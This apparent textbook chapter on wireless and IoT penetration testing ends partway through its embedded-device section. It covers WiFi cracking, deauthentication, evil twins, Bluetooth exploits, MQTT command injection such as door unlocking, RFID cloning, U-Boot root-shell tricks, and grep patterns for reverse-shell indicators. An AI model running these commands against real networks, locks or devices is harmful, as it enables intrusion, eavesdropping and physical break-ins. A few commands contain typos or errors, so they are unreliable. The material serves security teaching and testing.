# Chapter 6: Wireless and IoT Security Testing

## Table of Contents
1. [Introduction to Wireless Security](#introduction-to-wireless-security)
2. [WiFi Security Fundamentals](#wifi-security-fundamentals)
3. [WPA2 and WPA3 Attack Methodologies](#wpa2-and-wpa3-attack-methodologies)
4. [Bluetooth and BLE Exploitation](#bluetooth-and-ble-exploitation)
5. [IoT Firmware Analysis and Exploitation](#iot-firmware-analysis-and-exploitation)
6. [IoT Protocol Security Testing](#iot-protocol-security-testing)
7. [Zigbee and Z-Wave Security Assessment](#zigbee-and-z-wave-security-assessment)
8. [Software-Defined Radio (SDR) Attacks](#software-defined-radio-sdr-attacks)
9. [Embedded Device Hacking](#embedded-device-hacking)
10. [Wireless Security Tools and Frameworks](#wireless-security-tools-and-frameworks)
11. [Practical Wireless Pentest Methodology](#practical-wireless-pentest-methodology)
12. [Defensive Countermeasures](#defensive-countermeasures)

---

## Introduction to Wireless Security

Wireless networks and Internet of Things (IoT) devices represent one of the most challenging attack surfaces in modern penetration testing. Unlike traditional wired networks where physical access control provides a baseline layer of security, wireless networks broadcast data through the air, accessible to anyone within range with the appropriate equipment. This fundamental characteristic makes wireless security testing critical for any comprehensive security assessment.

The proliferation of IoT devices has exponentially expanded the wireless attack surface. From smart home devices and industrial sensors to medical equipment and critical infrastructure, billions of wireless-connected devices now handle sensitive data and control physical systems. Many of these devices were designed with convenience and cost-effectiveness as primary concerns, with security often treated as an afterthought.

Wireless penetration testing requires a unique combination of skills:
- **Radio frequency (RF) knowledge**: Understanding how wireless signals propagate, modulate, and can be intercepted
- **Cryptographic analysis**: Evaluating the strength of encryption and authentication mechanisms
- **Hardware hacking**: Working with embedded systems, firmware, and physical interfaces
- **Protocol analysis**: Understanding communication protocols at the packet level
- **Physical security awareness**: Recognizing that wireless extends beyond building perimeters

This chapter provides comprehensive coverage of wireless and IoT security testing methodologies, from fundamental WiFi attacks to advanced SDR exploitation techniques.

---

## WiFi Security Fundamentals

### WiFi Standards and Security Evolution

WiFi technology has evolved significantly since its introduction, with security mechanisms improving alongside performance capabilities:

**Wired Equivalent Privacy (WEP)**
WEP was the original security protocol for 802.11 networks, introduced in 1997. Despite its name, WEP provided nowhere near equivalent privacy to wired networks. Its vulnerabilities include:
- Use of RC4 stream cipher with weak key scheduling
- 24-bit Initialization Vector (IV) that eventually repeats
- No protection against message replay
- Weak integrity checking (CRC-32)
- Static encryption keys

WEP can be cracked in minutes using tools like Aircrack-ng, making it completely unsuitable for any security-conscious deployment.

**WiFi Protected Access (WPA)**
WPA was introduced in 2003 as an interim replacement for WEP, implementing the Temporal Key Integrity Protocol (TKIP). While more secure than WEP, WPA still relied on RC4 and has known vulnerabilities:
- Michael MIC vulnerability allowing packet injection
- NOMORE attack (KRACK variant) against TKIP
- Generally considered deprecated

**WiFi Protected Access 2 (WPA2)**
WPA2 became mandatory in 2006 and introduced the Robust Security Network (RSN) using AES-CCMP encryption. WPA2 comes in two flavors:
- **WPA2-Personal (PSK)**: Uses pre-shared key authentication, vulnerable to offline dictionary attacks
- **WPA2-Enterprise (802.1X)**: Uses RADIUS authentication with per-session keys, significantly more secure

**WiFi Protected Access 3 (WPA3)**
WPA3, introduced in 2018, addresses many WPA2 weaknesses:
- Simultaneous Authentication of Equals (SAE) replaces PSK, providing forward secrecy
- Protected Management Frames (PMF) mandatory
- 192-bit security mode for sensitive environments
- Individual data encryption in open networks (OWE - Opportunistic Wireless Encryption)

### WiFi Frame Structure

Understanding WiFi frame structure is essential for security testing:

```
Frame Control (2 bytes):
  - Protocol version (2 bits)
  - Type (2 bits): Management (00), Control (01), Data (10), Extension (11)
  - Subtype (4 bits): Association, Authentication, Beacon, etc.
  - Flags: To DS, From DS, More Fragments, Retry, Power Management, More Data, Protected Frame, Order

Duration/ID (2 bytes): Duration for NAV or AID in PS-Poll
Address 1-4 (6 bytes each): MAC addresses (BSSID, source, destination, etc.)
Sequence Control (2 bytes): Fragment number and sequence number
Frame Body (0-2312 bytes): Payload data
FCS (4 bytes): Frame Check Sequence (CRC-32)
```

Management frames include:
- **Beacon frames**: Advertise network presence and capabilities
- **Probe Request/Response**: Device discovery mechanism
- **Authentication**: Initial security handshake
- **Association/Reassociation**: Connect to access point
- **Disassociation/Deauthentication**: Terminate connections

Control frames manage medium access:
- **RTS/CTS**: Request/Clear to Send for collision avoidance
- **ACK**: Acknowledgment of received frames
- **PS-Poll**: Power save polling

Data frames carry the actual network traffic.

### WiFi Reconnaissance

Effective wireless penetration testing begins with comprehensive reconnaissance:

**Passive Scanning**
Passive scanning involves listening for beacon frames and other wireless traffic without transmitting any probes:

```bash
# Enable monitor mode on wireless interface
sudo airmon-ng start wlan0

# Capture all traffic on channel 6
sudo airodump-ng -c 6 --bssid <target_bssid> -w capture mon0

# Channel hopping scan
sudo airodump-ng mon0 -w full_scan
```

Passive scanning advantages:
- Completely undetectable by target networks
- Captures hidden SSIDs when clients connect
- Records all management and data frames
- Maintains operational security

**Active Scanning**
Active scanning transmits probe requests to discover networks:

```bash
# Send directed probe requests
sudo iwlist wlan0 scan

# Use mdk4 for active probing with specific SSID
sudo mdk4 wlan0 p -t <target_ssid> -c 6
```

Active scanning risks:
- Can be detected by intrusion detection systems
- Reveals attacker's MAC address
- May trigger defensive countermeasures

**SSID Discovery Techniques**
Hidden SSIDs (non-broadcast) require special techniques:

```bash
# Monitor for association frames revealing hidden SSID
sudo airodump-ng mon0 --essid ""

# Force deauthentication to capture association
sudo aireplay-ng -0 5 -a <ap_mac> mon0

# Use wireshark filter to find SSID in captured frames
wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x04
```

---

## WPA2 and WPA3 Attack Methodologies

### WPA2-Personal (PSK) Attacks

The primary vulnerability in WPA2-Personal is the four-way handshake, which can be captured and attacked offline.

**Four-Way Handshake Capture**
The four-way handshake establishes session keys between client and access point:

```bash
# Step 1: Identify target network
sudo airodump-ng mon0

# Step 2: Capture handshake on specific channel
sudo airodump-ng -c <channel> --bssid <ap_mac> -w handshake_capture mon0

# Step 3: Force reauthentication (deauth attack)
# In another terminal:
sudo aireplay-ng -0 10 -a <ap_mac> -c <client_mac> mon0

# Step 4: Verify handshake capture
aircrack-ng handshake_capture-01.cap
```

**Dictionary and Brute Force Attacks**
Once the handshake is captured, offline cracking attempts begin:

```bash
# Dictionary attack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <ap_mac> handshake_capture-01.cap

# Rule-based attack with Hashcat
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Brute force attack (mask attack)
hashcat -m 2500 handshake.hccapx -a 3 ?d?d?d?d?d?d?d?d?d?d

# GPU-accelerated attack
hashcat -m 2500 handshake.hccapx wordlist.txt -O -w 3
```

**PMKID Attack (WPA/WPA2)**
The PMKID attack, discovered by hashcat team in 2018, extracts the Pairwise Master Key Identifier without needing a full handshake:

```bash
# Capture PMKID using hcxdumptool
sudo hcxdumptool -i mon0 -o pmkid_capture.pcapng --enable_status=1

# Convert for hashcat
hcxpcaptool -z pmkid_hash.txt pmkid_capture.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid_hash.txt /usr/share/wordlists/rockyou.txt
```

Advantages of PMKID attack:
- Requires only one frame (no client needed)
- Works against all access points supporting roaming features
- Faster capture process

**WPS Attacks**
WiFi Protected Setup (WPS) PIN method is vulnerable to brute force:

```bash
# WPS PIN brute force with Reaver
sudo reaver -i mon0 -b <ap_mac> -vv -K 1

# Pixie Dust attack (exploits weak RNG)
sudo reaver -i mon0 -b <ap_mac> -vv -K 1 -P

# Bully WPS attack tool
sudo bully -b <ap_mac> -c <channel> -v 3 mon0
```

WPS vulnerabilities:
- Only 11,000 effective PINs due to checksums
- Pixie Dust attack recovers PIN in seconds on vulnerable APs
- Many routers don't implement lockout properly

### WPA3 Attack Vectors

While WPA3 significantly improves security, it's not invulnerable:

**Dragonblood Attacks**
Research by Mathy Vanhoef and Eyal Ronen identified multiple WPA3 vulnerabilities:

1. **SAE Side-Channel Attacks**: Timing and cache side-channels in SAE handshake
2. **Downgrade Attacks**: Forcing WPA3 to use weaker protocols
3. **Curve Ball Attacks**: Invalid curve attacks on SAE implementation

```bash
# Detect WPA3 networks
sudo airodump-ng mon0 | grep WPA3

# Check for transition mode (WPA2/WPA3 mixed)
sudo airodump-ng mon0 --wps

# Attempt downgrade attack (requires specific tools)
# Research implementations available on dragonblood.org
```

**Enterprise Attack Vectors**
WPA3-Enterprise with 192-bit mode is significantly more secure, but implementation errors occur:

```bash
# EAP enumeration
sudo eapmd5pass -r capture.pcap -w wordlist.txt

# EAP-TTLS/PAP attacks
asleap -C <challenge> -R <response> -W wordlist.txt
```

### Advanced WiFi Attacks

**KRACK (Key Reinstallation Attacks)**
KRACK exploits the four-way handshake by manipulating and replaying cryptographic handshake messages:

```bash
# Detect vulnerable clients
# Using modified hostapd for testing
# Implementation: https://github.com/vanhoefm/krackattacks-scripts

# PoC requires specific setup
./krack-ft-test.py <interface> <ap_mac> <client_mac>
```

**FragAttacks (Fragmentation and Aggregation Attacks)**
Design flaws in WiFi frame aggregation and fragmentation:

```bash
# Test for fragmentation vulnerabilities
# Tools available at: https://github.com/vanhoefm/fragattacks

python3 fragattack.py <interface> ping I,E --peer <ap_mac>
```

**Evil Twin and Rogue Access Point Attacks**

```bash
# Create evil twin with hostapd-mana
sudo hostapd-mana hostapd-mana.conf

# Configuration file (hostapd-mana.conf):
interface=wlan0
ssid=LegitimateNetwork
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=users.txt
mana_wpe=1

# Captive portal attack with Wifiphisher
sudo wifiphisher -aI wlan0 -e "Starbucks_WiFi" -p oauth-login
```

**KARMA Attack**
KARMA responds to all probe requests with positive responses, tricking devices into connecting:

```bash
# Using hostapd-mana for KARMA
sudo hostapd-mena hostapd-karma.conf

# mana.conf settings:
enable_mana=1
mana_loud=0
mana_macacl=0
```

---

## Bluetooth and BLE Exploitation

### Bluetooth Technology Overview

Bluetooth operates in the 2.4 GHz ISM band using frequency-hopping spread spectrum. Versions include:
- **Bluetooth Classic (BR/EDR)**: Traditional Bluetooth for audio and data
- **Bluetooth Low Energy (BLE)**: Designed for low power consumption, different protocol stack
- **Bluetooth 5.x**: Extended range and improved BLE features

**Bluetooth Addressing**
- BD_ADDR: 48-bit Bluetooth device address
- Public Address: Fixed, manufacturer-assigned
- Random Address: Privacy feature, periodically changed

### Bluetooth Reconnaissance

```bash
# Scan for Bluetooth devices
hcitool scan

# Detailed device inquiry
hcitool inq

# Low Energy device discovery
sudo hcitool lescan

# Bluetooth service enumeration
sdptool browse <bd_addr>

# Comprehensive BLE scanning with bettercap
sudo bettercap -eval "ble.recon on; ble.show"
```

### Bluetooth Classic Attacks

**BlueBorne**
Set of vulnerabilities affecting Bluetooth stack implementations:

```bash
# BlueBorne exploit framework
# Available at: https://github.com/ArmisSecurity/blueborne

python2 blueborne.py -t <target_bd_addr> -c "cat /etc/passwd"
```

**Bluetooth PIN Cracking**

```bash
# Crack Bluetooth PIN
# Requires captured pairing data
btcrack -b <bd_addr> -r <randomizer> -s < cipher>
```

**Bluesnarfing and Bluebugging**
Unauthorized access to device information and functionality:

```bash
# Bluesnarfer for information extraction
sudo bluesnarfer -r 1-100 -b <bd_addr>

# AT command injection
sudo minicom -D /dev/rfcomm0
```

### Bluetooth Low Energy (BLE) Attacks

**BLE Reconnaissance**

```bash
# GATT service enumeration
gatttool -b <bd_addr> -I
> connect
> primary
> characteristics
> char-read-hnd 0x0001

# Using bleah for BLE analysis
sudo bleah -t <bd_addr> -e

# Bettercap BLE reconnaissance
sudo bettercap
gap > ble.recon on
gap > ble.show
gap > ble.enum <mac_address>
```

**BLE Sniffing**

```bash
# Ubertooth BLE sniffing
ubertooth-btle -f -c capture.pcap

# Crackle for decrypting captured BLE
# Requires pairing information
crackle -i capture.pcap -o decrypted.pcap
```

**BLE Spoofing and MITM**

```bash
# GATTacker for BLE MITM
sudo node gattacker.js -a <target_mac>

# BtleJuice for BLE proxy attacks
sudo btlejuice-proxy -u <target_mac>
# Then in another terminal:
sudo btlejuice -u <target_mac> -w
```

**KNOB and KISS Attacks**
Key Negotiation of Bluetooth and Key Injection attacks:

```bash
# KNOB attack reduces encryption key entropy
# Requires specialized hardware (two Bluetooth dongles)
# Implementation available in research repositories
```

**BLE Key Fob and Access Control Attacks**

Many BLE-based access control systems have implementation flaws:

```bash
# Replay attack preparation
# Capture unlock command
gatttool -b <bd_addr> -I
> connect
> char-write-cmd <handle> <value>

# Replay with modified values
sudo python3 ble_replay.py -m <mac> -d <data>
```

### BLE Security Assessment Checklist

1. **Pairing Method Analysis**
   - Just Works: No MITM protection, no passive eavesdropping protection
   - Passkey Entry: MITM protection, no passive eavesdropping protection
   - OOB (Out of Band): Full protection
   - Numeric Comparison: Full protection (LE Secure Connections)

2. **Encryption Verification**
   - Check encryption level (LE Legacy vs LE Secure Connections)
   - Verify key size (minimum 7 octets, should be 16)
   - Confirm bonding stores keys securely

3. **Attribute Permissions**
   - Read/write permissions on GATT characteristics
   - Authentication requirements
   - Authorization checks

4. **Fixed PIN/Tokens**
   - Hardcoded credentials in firmware
   - Static passkeys
   - Predictable authentication tokens

---

## IoT Firmware Analysis and Exploitation

### Firmware Acquisition

**Direct Download from Manufacturer**

```bash
# Automated firmware download with firmwalker
git clone https://github.com/craigz28/firmwalker
cd firmwalker
./firmwalker.sh

# Download with firmware-mod-kit
wget <firmware_url> -O firmware.bin
```

**Extraction from Hardware**

```bash
# Identify flash chip with flashrom
sudo flashrom -p ch341a_spi -r firmware_backup.bin

# Dump firmware via UART
sudo minicom -D /dev/ttyUSB0 -b 115200
# Access bootloader and dump flash

# JTAG extraction with JTAGulator
# Connect to JTAG pins and identify interface
jtagulator> detect
jtagulator> idcode
jtagulator> dump
```

**Over-the-Air (OTA) Interception**

```bash
# DNS spoofing to intercept OTA updates
dnsspoof -i eth0 -f spoofhosts.conf

# Proxy interception with Burp Suite
# Configure device to use Burp as proxy

# SSL stripping for OTA downloads
sslstrip -l 8080
```

### Firmware Extraction and Analysis

**Binwalk Analysis**

Binwalk is the essential tool for firmware analysis:

```bash
# Basic firmware scan
binwalk firmware.bin

# Extract all identifiable components
binwalk -e firmware.bin

# Recursive extraction
binwalk -M firmware.bin

# Entropy analysis for encrypted/compressed sections
binwalk -E firmware.bin

# Generate signature file for unknown formats
binwalk -A firmware.bin
```

**Firmware Extraction Workflow**

```bash
# Step 1: Identify firmware structure
binwalk -t firmware.bin

# Step 2: Extract filesystem
binwalk -e firmware.bin

# Step 3: If extraction fails, manual carving
# Determine offset of filesystem
dd if=firmware.bin of=filesystem.squashfs bs=1 skip=<offset>

# Step 4: Mount filesystem
sudo mount -t squashfs filesystem.squashfs /mnt/firmware

# Step 5: Analyze extracted content
cd _firmware.bin.extracted/
tree -L 3
```

**Alternative Extraction Tools**

```bash
# Firmware Mod Kit
./extract-firmware.sh firmware.bin

# FACT - Firmware Analysis and Comparison Tool
docker run -p 5000:5000 fkiecad/fact-core

# EMBA - Embedded Analyzer
sudo ./emba.sh -f firmware.bin -l log_dir
```

### Firmware Vulnerability Analysis

**Static Analysis**

```bash
# String analysis for credentials, keys, URLs
strings firmware.bin | grep -i password
strings firmware.bin | grep -E '^[A-Za-z0-9+/]{40,}={0,2}$'  # Base64 patterns
strings extracted/rootfs/bin/busybox | grep -i "version"

# Search for hardcoded credentials
grep -r "admin" _firmware.bin.extracted/
grep -ri "password\|passwd\|pwd" _firmware.bin.extracted/

# Analyze configuration files
cat _firmware.bin.extracted/etc/passwd
cat _firmware.bin.extracted/etc/shadow
cat _firmware.bin.extracted/etc/config/network

# Certificate and key extraction
find _firmware.bin.extracted/ -name "*.pem" -o -name "*.key" -o -name "*.crt"

# Backdoor detection
yara -r backdoor_rules.yar _firmware.bin.extracted/
```

**Binary Analysis**

```bash
# Identify CPU architecture
file _firmware.bin.extracted/sbin/init
readelf -h _firmware.bin.extracted/bin/busybox

# Disassembly with Ghidra
# Import binary, analyze, search for vulnerable functions

# Function analysis with radare2
r2 -A _firmware.bin.extracted/bin/vulnerable_binary
[0x00000000]> ii    # Show imports
[0x00000000]> iS    # Show sections
[0x00000000]> s sym.main
[0x00000000]> pdf   # Disassemble function
[0x00000000]> /c strcpy  # Find dangerous function calls

# Common vulnerable patterns search
r2 -q -c '/c strcpy; /c sprintf; /c gets' firmware_binary
```

**Emulation for Dynamic Analysis**

```bash
# QEMU user-mode emulation
qemu-arm-static -L /usr/arm-linux-gnueabihf/ ./extracted_binary

# Full system emulation with QEMU
qemu-system-arm -M versatilepb -kernel vmlinuz -initrd rootfs.img -append "root=/dev/ram"

# Firmadyne - Automated firmware emulation
git clone https://github.com/firmadyne/firmadyne
./download.sh
./extract.sh firmware.bin
./getArch.sh ./images/<image_id>.tar.gz
./makeImage.sh ./images/<image_id>.tar.gz
./inferNetwork.sh <image_id>
./run.sh <image_id>

# ARM-X firmware emulation framework
sudo ./armx.sh -f firmware.bin -t arm
```

### Backdoor and Rootkit Detection

```bash
# Search for common backdoor signatures
yara -r backdoor_rules.yar extracted_fs/

# Check for unauthorized listeners
grep -r "nc -l\|netcat -l\|/bin/sh" extracted_fs/etc/init.d/

# Analyze cron jobs
cat extracted_fs/etc/crontab
find extracted_fs/ -name "cron*" -type f -exec cat {} \;

# Telnet/SSH backdoor detection
grep -r "telnetd\|dropbear\|sshd" extracted_fs/etc/

# Reverse shell indicators
grep -rE "bash -i\|/dev/tcp/\|python.*socket" extracted_fs/
```

---

## IoT Protocol Security Testing

### MQTT Security Assessment

MQTT (Message Queuing Telemetry Transport) is a lightweight publish-subscribe protocol widely used in IoT.

**MQTT Architecture**
- Broker: Central server handling message distribution
- Publisher: Sends messages to topics
- Subscriber: Receives messages from topics
- Topics: Hierarchical message categories

**MQTT Reconnaissance**

```bash
# Port scanning for MQTT
nmap -p 1883,8883,8884 --script mqtt-subscribe <target>

# Test anonymous authentication
mosquitto_sub -h <target> -t "#" -v

# Discover topics with mqtt-pwn
python3 mqtt-pwn.py
> connect <target>
> info
> dump_topics

# Enumerate topics with Nmap scripts
nmap --script mqtt-subscribe -p 1883 <target>
```

**MQTT Attack Vectors**

1. **Anonymous Authentication**
```bash
# Subscribe to all topics anonymously
mosquitto_sub -h <target> -t "#" -v

# Publish to topics without authentication
mosquitto_pub -h <target> -t "home/living_room/light" -m "ON"
```

2. **Weak Authentication**
```bash
# Brute force MQTT credentials
# Using mqtt-pwn dictionary attack
python3 mqtt-pwn.py
> connect <target>
> bruteforce -u users.txt -p passwords.txt

# Hydra brute force
hydra -L users.txt -P passwords.txt <target> mqtt
```

3. **Topic Sniffing and Injection**
```bash
# Subscribe to sensitive topics
mosquitto_sub -h <target> -t "sensors/+/temperature" -v
mosquitto_sub -h <target> -t "$SYS/#" -v  # System topics

# Inject malicious commands
mosquitto_pub -h <target> -t "devices/controller/command" -m '{"action": "unlock_door"}'
```

4. **Retained Message Manipulation**
```bash
# Overwrite retained messages
mosquitto_pub -h <target> -t "config/system_mode" -m "malicious_value" -r

# Delete retained messages by publishing empty payload
mosquitto_pub -h <target> -t "config/system_mode" -n -r
```

5. **Last Will and Testament Abuse**
```bash
# Craft malicious LWT
mosquitto_pub -h <target> -t "active" -m "online" --will-topic "devices/alarm" --will-payload "TRIGGER_ALARM"
```

**MQTT Security Testing Tools**

```bash
# mqtt-pwn - Comprehensive MQTT pentest framework
git clone https://github.com/akamai-threat-research/mqtt-pwn
cd mqtt-pwn
pip install -r requirements.txt
python3 mqtt-pwn.py

# mqttsploit - MQTT exploitation framework
git clone https://github.com/FabioBaroni/mqttsploit

# MQTT.fx - GUI client for testing
# Download from: https://mqttfx.jensd.de/
```

### CoAP Security Testing

CoAP (Constrained Application Protocol) is designed for constrained devices and networks.

**CoAP Reconnaissance**

```bash
# CoAP scanning with nmap
nmap -p 5683,5684 -sU --script coap-resources <target>

# CoAP client testing
coap-client -m get coap://<target>:5683/.well-known/core

# Discover resources
python3 coap-scan.py <target>
```

**CoAP Attack Vectors**

1. **Unauthorized Access**
```bash
# GET resources without authentication
coap-client -m get coap://<target>:5683/sensors/temperature

# PUT/POST without authorization
coap-client -m put coap://<target>:5683/config/mode -e "override"
```

2. **Resource Enumeration**
```bash
# Brute force CoAP resources
for resource in $(cat coap_wordlist.txt); do
    coap-client -m get coap://<target>:5683/$resource
done
```

3. **Observe Pattern Abuse**
```bash
# Subscribe to all observable resources
coap-client -m get -s 60 coap://<target>:5683/sensors/+ -O 6
```

### DTLS and UDP Protocol Security

Many IoT protocols use DTLS for security:

```bash
# DTLS scanning
dtls-scan <target>:5684

# Test DTLS versions
openssl s_client -dtls1 -connect <target>:5684
openssl s_client -dtls1_2 -connect <target>:5684

# DTLS handshake analysis with Wireshark
# Filter: dtls
```

### AMQP and Other Protocols

```bash
# AMQP testing with nmap
nmap -p 5672,5671 --script amqp-info <target>

# STOMP protocol testing
curl -v telnet://<target>:61613

# XMPP for IoT
nmap -p 5222 --script xmpp-info <target>
```

---

## Zigbee and Z-Wave Security Assessment

### Zigbee Security Fundamentals

Zigbee operates on IEEE 802.15.4 in the 2.4 GHz band (global), 915 MHz (Americas), and 868 MHz (Europe).

**Zigbee Network Layers**
- **PHY Layer**: Radio transmission
- **MAC Layer**: CSMA-CA, acknowledgments, association
- **NWK Layer**: Routing, network formation
- **APS Layer**: Application support, security
- **ZDO**: Zigbee Device Objects

**Zigbee Security Models**
- **Centralized Trust Center**: Commercial mode with pre-configured link keys
- **Distributed Trust Center**: Residential mode, simpler key distribution
- **Network Layer Security**: Optional encryption with network key
- **APS Layer Security**: End-to-end encryption with link keys

### Zigbee Security Testing

**Hardware Requirements**
- CC2531 USB dongle with Zigbee sniffer firmware
- Atmel RZ Raven USB stick
- Ubertooth One (limited Zigbee support)
- HackRF One with GNU Radio

**Zigbee Reconnaissance**

```bash
# Using killerbee framework
zbid  # Identify available interfaces

# Channel scanning
zbstumbler

# Capture packets
zbdump -c 15 -w zigbee_capture.pcap

# Replay captured packets
zbreplay -c 15 -r zigbee_capture.pcap
```

**Zigbee Encryption Key Extraction**

The Zigbee network key is often transmitted in plaintext during device joining:

```bash
# Capture during device pairing
zbdump -c 15 -w pairing_capture.pcap

# Extract keys with Wireshark
# Filter: zigbee_aps.type == 0x05 (transport key)

# Decrypt traffic with known key
# Wireshark Preferences -> Protocols -> Zigbee -> Pre-configured Keys
```

**Zigbee Attack Tools**

```bash
# killerbee - Zigbee security framework
# Installation:
git clone https://github.com/riverloopsec/killerbee
cd killerbee
sudo python setup.py install

# Attacking with killerbee
# Jamming
zbjammer -c 15 -d 60

# Replay attack
zbreplay -c 15 -r capture.pcap -s 2

# Inject packets
zbinject -c 15 -f injected_frame.pcap

# NWK key bruteforce (if using default keys)
zbgoodfind -r capture.pcap -f factory_defaults.txt
```

**ZigBee Light Link (ZLL) Attacks**

ZLL Commissioning Touchlink can be exploited:

```bash
# ZLL touchlink attack
# Using modified killerbee tools
zbtouchlink -c 15 -a <target_mac>

# Reset target to factory defaults
zbtouchlink -c 15 -a <target_mac> --reset
```

### Z-Wave Security Assessment

Z-Wave operates in sub-GHz frequencies (908.42 MHz US, 868.42 MHz EU).

**Z-Wave Security Evolution**
- **Security 0 (S0)**: AES-128 encryption, vulnerable to interception during inclusion
- **Security 2 (S2)**: Elliptic Curve Diffie-Hellman, improved key exchange

**Z-Wave Reconnaissance**

```bash
# Using OpenZWave or similar libraries
# Z-Wave sniffing requires specialized hardware

# Z-Wave packet capture with Yard Stick One and RFCat
sudo rfcat -r
> d.setFreq(908420000)
> d.setMdmModulation(MOD_2FSK)
> d.setMdmDRate(9600)
> d.RFlisten()
```

**Z-Wave Attack Vectors**

1. **S0 Key Interception**
   - Capture during device inclusion
   - Network key transmitted with known default encryption

2. **Z-Wave Controller Impersonation**
   - Clone controller ID
   - Take over network

3. **Replay Attacks**
   - Capture and replay control commands

```bash
# Z-Wave replay with SDR
# Using GNU Radio companion flowgraph
# Record and replay on 908.42 MHz
```

---

## Software-Defined Radio (SDR) Attacks

### SDR Fundamentals

Software-Defined Radio uses software to process radio signals, enabling analysis and transmission of virtually any radio protocol.

**Common SDR Hardware**
- **RTL-SDR**: $20-30, receive-only, 24-1766 MHz
- **HackRF One**: $300, half-duplex, 1 MHz - 6 GHz
- **USRP B210**: $1700, full-duplex, 70 MHz - 6 GHz
- **BladeRF**: $420, full-duplex, 47 MHz - 6 GHz
- **LimeSDR**: $299, full-duplex, 100 kHz - 3.8 GHz

### SDR Tools and Setup

```bash
# GNU Radio installation
sudo apt-get install gnuradio gr-osmosdr

# RTL-SDR tools
sudo apt-get install rtl-sdr
rtl_test  # Test RTL-SDR device
rtl_sdr -f 915000000 -s 2048000 capture.iq

# HackRF tools
sudo apt-get install hackrf
hackrf_info  # Verify device
hackrf_sweep -f 100:6000 -w 1000000

# GQRX - SDR receiver
gqrx

# CubicSDR - Alternative SDR application
cubicsdr
```

### Wireless Signal Analysis

**Frequency Identification**

```bash
# Spectrum analysis with hackrf_sweep
hackrf_sweep -f 300:6000 -r spectrum.csv

# Visualize with Python
import pandas as pd
import matplotlib.pyplot as plt
data = pd.read_csv('spectrum.csv')
plt.plot(data['frequency'], data['power'])
plt.show()
```

**Signal Demodulation**

```bash
# AM demodulation
gnuradio-companion
# Use AM Demod block in flowgraph

# FM demodulation
rtl_fm -f 144.39M -s 22050 - | aplay -r 22050 -f S16_LE

# Decode digital signals with Universal Radio Hacker
urh
```

### RFID and NFC Attacks

**RFID Reconnaissance**

```bash
# Proxmark3 - RFID swiss army knife
proxmark3> hw tune
proxmark3> lf search
proxmark3> hf search

# Read LF (125/134 kHz) tags
proxmark3> lf em4x em41xdemod
proxmark3> lf hid fskdemod

# Read HF (13.56 MHz) tags
proxmark3> hf 14a read
proxmark3> hf mf chk
```

**RFID Cloning**

```bash
# Clone EM4100 tag
proxmark3> lf em4x em41xdemod
proxmark3> lf em4x em41xwrite <id> <card_type>

# Clone HID prox card
proxmark3> lf hid fskdemod
proxmark3> lf hid clone <id>

# MIFARE Classic attacks
proxmark3> hf mf chk *1 ? t  # Test default keys
proxmark3> hf mf nested 1 0 A <found_key>  # Nested attack
proxmark3> hf mf darkside  # Darkside attack
proxmark3> hf mf dump 1  # Dump card contents
```

**NFC Attacks with PN532/ACR122U**

```bash
# Using libnfc
nfc-list  # List NFC devices
nfc-poll  # Wait for tag

# MIFARE Classic exploitation with mfoc
mfoc -O dump.mfd  # Obtain keys and dump

# Write cloned tag
nfc-mfclassic w a dump.mfd
```

### Garage Door and Key Fob Analysis

```bash
# Capture key fob signal
# Set frequency based on region (315/433/868 MHz)
rtl_433 -f 433920000 -S unknown -T 120

# Analyze with Universal Radio Hacker
urh -d capture.cu8

# Replay attack (if no rolling code)
tx_tools -f 433920000 -r capture.iq

# Decode with rtl_433
rtl_433 -r capture.cu8 -a
```

### Rolling Code (KeeLoq) Analysis

```bash
# KeeLoq analysis with PandwaRF
# Requires specialized hardware

# Capture multiple codes
rtl_433 -f 433920000 -S all

# Attempt KeeLoq decryption with known manufacturer key
# Requires cryptographic analysis tools
```

---

## Embedded Device Hacking

### Hardware Reconnaissance

**Component Identification**

```bash
# Identify ICs and components
# Use online databases:
# - alldatasheet.com
# - chipworks.com
# - icbank.com

# Look for:
# - UART pins (TX, RX, GND, VCC)
# - JTAG/SWD interfaces
# - SPI/I2C flash chips
# - Unpopulated headers
```

**UART Discovery**

```bash
# Identify UART with JTAGulator
# Connect suspected pins and scan baud rates

# Logic analyzer capture
# Saleae Logic, PulseView, or OpenLogic Sniffer

# Common baud rates: 9600, 38400, 115200
```

### Serial Console Access

```bash
# Connect with USB-to-Serial adapter
sudo minicom -D /dev/ttyUSB0 -b 115200

# Alternative: screen
sudo screen /dev/ttyUSB0 115200

# Alternative: picocom
sudo picocom -b 115200 /dev/ttyUSB0

# Intercept boot process - watch for:
# - U-Boot commands
# - Kernel boot parameters
# - Debug output
# - Root password hints
```

**U-Boot Exploitation**

```bash
# Interrupt boot process (usually pressing any key)
U-Boot> help              # List available commands
U-Boot> printenv          # Display environment variables
U-Boot> bdinfo            # Board info
U-Boot> sf probe          # Probe SPI flash
U-Boot> sf read 0x80000000 0x0 0x100000  # Read flash to RAM
U-Boot> md 0x80000000     # Display memory contents

# Modify bootargs for root shell
U-Boot> setenv bootargs console=ttyS0,115200 root=/bin/sh
U-Boot> boot

# Load custom kernel/initrd via TFTP
U-Boot> setenv ipaddr 192.168.1.10
U-Boot> setenv serverip 192.168.1.5
U-Boot> tftpboot 0x80000000 custom_kernel.bin
U-Boot> bootm 0x80000000
```

### JTAG and Debug Interface Exploitation

**JTAG Discovery**

```bash
# JTAGulator - automated JTAG discovery
# Connect suspected pins and run scan
JTAGulator> detect

# JTAGenum - Arduino-based discovery
# Requires building custom probe

# Identify JTAG pins with multimeter:
# - VCC (3.3V or 1.8V)
# - GND (continuity test)
# - TRST (pull-up resistor)
# - TCK, TMS, TDI, TDO
```

**OpenOCD Configuration**

```bash
# Install OpenOCD
sudo apt-get install openocd

# Common OpenOCD commands
sudo openocd -f interface/jlink.cfg -f target/stm32f1x.cfg

# In telnet session:
telnet localhost 4444
> halt                    # Stop CPU
> reg                     # Show registers
> mdw 0x08000000 100      # Read memory (flash start)
> dump_image flash.bin 0x08000000 0x100000
> flash read_bank 0 flash_backup.bin
```

**SWD (Serial Wire Debug)**

```bash
# SWD with ST-Link
sudo openocd -f interface/stlink.cfg -f target/stm32f4x.cfg

# SWD with J-Link
sudo openocd -f interface/jlink.cfg -f target/nrf52.cfg

# SWD with Bus Pirate
